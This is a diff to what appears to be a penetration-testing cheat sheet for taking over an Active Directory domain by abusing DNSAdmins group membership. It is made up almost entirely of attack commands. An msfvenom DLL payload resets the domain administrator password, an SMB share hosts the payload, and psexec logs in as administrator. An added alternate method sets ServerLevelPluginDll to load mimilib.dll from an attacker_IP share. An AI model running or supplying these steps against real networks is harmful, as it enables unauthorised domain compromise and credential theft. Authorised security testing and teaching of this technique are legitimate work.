@@ -4,6 +4,14 @@
 
 ### Steps:
 
+## Enumeration
+
+ - Get-NetGroupMember -GroupName "DNSAdmins"
+
+ - Get-ADGroupMember -Identity DNSAdmins
+
+## Exploitation
+
 #### 1) msfvenom -p windows/x64/exec cmd='net user administrator P@55w0rd123! /domain' -f dll > pwn.dll
 
 #### 2) sudo smbserver.py share ./ (Host the file remotely)
@@ -17,3 +25,15 @@
 #### 6) sudo psexec.py DOMAIN.LOCAL/administrator@DC_IP
 
 #### 7) PWN3D!
+
+## Alternate Method: DNSServer module
+
+ - $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
+
+ - $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
+
+ - Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
+
+### Check for successful previous command
+
+ - Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
